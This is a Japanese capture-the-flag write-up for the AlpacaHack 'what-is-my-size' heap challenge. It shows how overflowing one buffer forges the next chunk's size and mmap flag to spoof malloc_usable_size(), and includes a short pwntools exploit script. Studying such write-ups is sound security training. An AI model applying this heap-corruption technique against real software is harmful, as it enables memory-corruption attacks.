# ■ Writeup::what-is-my-size
[what-is-my-size - AlpacaHack](https://alpacahack.com/challenges/what-is-my-size)

# 1. Solution
- `buf_1` への入力時に起こるBOFを利用して `buf_2` のヘッダを書き換え, `malloc_usable_size(buf_2)` の戻り値を `0x100` にする.
- `buf_2` の `IS_MMAPPED(M)` フラグを `1` に偽装して任意のサイズを読み込ませる. また, このときのチャンクサイズ計算式は `size - 16` からなり, 指定する `buf_2` のサイズは `size - 16 = 256 <=> size = 272` となる.
- `buf_1` のデータ領域から `buf_2` のサイズまでのオフセットは `buf_1::data(16 bytes) + buf_2::prev_size(8 bytes) = 24 bytes`.

以上をprimitiveとして, `solve.py`は

```Python
from pwn import *
_, HOST, PORT = 'nc localhost 1337'.split()
io = remote(HOST, PORT)

payload = b'A' * 16 # buf_1::data
payload += b'\x00' * 8 # buf_2::prev_size
payload += p64((0x100 + 2 * 8) + 0b011) # buf_2::size + A,M,P-flag
io.sendline(payload)

io.interactive()
```

# 2. Explanation
## 2.1. `buf_1` と `buf_2` のヒープ領域内の関係

```
Offset      Size       内容
──────────────────────────────────────
-0x10       8 bytes    buf_1 prev_size
-0x08       8 bytes    buf_1 size
 0x00       8 bytes    buf_1 user data
 0x08       8 bytes    buf_1 user data
──────────────────────────────────────
 0x10       8 bytes    buf_2 prev_size
 0x18       8 bytes    buf_2 size
 0x20       8 bytes    buf_2 user data
 0x28       8 bytes    buf_2 user data
──────────────────────────────────────
```

`buf_1::data` から `buf_2::size` までのオフセットは `buf_1::data(16 bytes) + buf_2::prev_size(8 bytes) = 24 bytes`.

## 2.2. AMPフラグ
チャンクサイズ `size` は8-byteにアラインメントされるため, 下位3ビットがそれぞれAMPフラグとして使用される.

```
63               3   2   1   0
+----------------+---+---+---+
| size (61 bits) | A | M | P |
+----------------+---+---+---+
```

## 2.3. `malloc_usable_size()`
`malloc_usable_size()` は `M` フラグによって計算方式が変わる. また, `malloc_usable_size()` は `musable()` を経由してサイズを算出する.

### 2.3.1. M=0 (通常のarenaチャンク)
`musable()` は `inuse(p)` を呼び出す.

```C
#define inuse(p) ((((mchunkptr)(((char *)(p) + chunksize(p)))->mchunk_size)) & PREV_INUSE)

else if (inuse(p))
    return memsize(p);
```


これは対象チャンク `p` の次のチャンクの `mchunk_size` に含まれる `PREV_INUSE` ビットを参照する.

次のチャンク `PREV_INUSE` が1であれば対象チャンク `p` は使用中と判断され, サイズを返す. 計算式は `chunksize - 8`.

次のチャンク `PREV_INUSE` が0であれば対象チャンク `p` はfree状態と判断され, `malloc_usable_size()` は `0` を返す.

### 2.3.2. M=1 (mmapチャンク)
`musable()` は `inuse(p)` によるチェックを行わず, 直接 `memsize(p)` を呼び出す.

```C
# define CHUNK_HDR_SZ (2 * SIZE_SZ)

	if (chunk_is_mmapped(p))
		return chunksize(p) - CHUNK_HDR_SZ;
```

計算式は `chunksize - 2 * 8`.

### 2.3.3. 今回の場合
`M = 1` として直接 `memsize(p)` を呼び出すようにすることで, 任意のサイズを得られる.

目標とする戻り値は `0x100` なので, 必要なチャンクサイズは

$$
\text{chunksize} - 2 \times 8 = \text{0x100} \iff \text{chunksize} = \text{0x110}
$$

ここに `M` フラグ( `0x2` )と `P` フラグ( `0x1` )を加算するので, `buf_2::size` へ書き込む値は `0x113`.
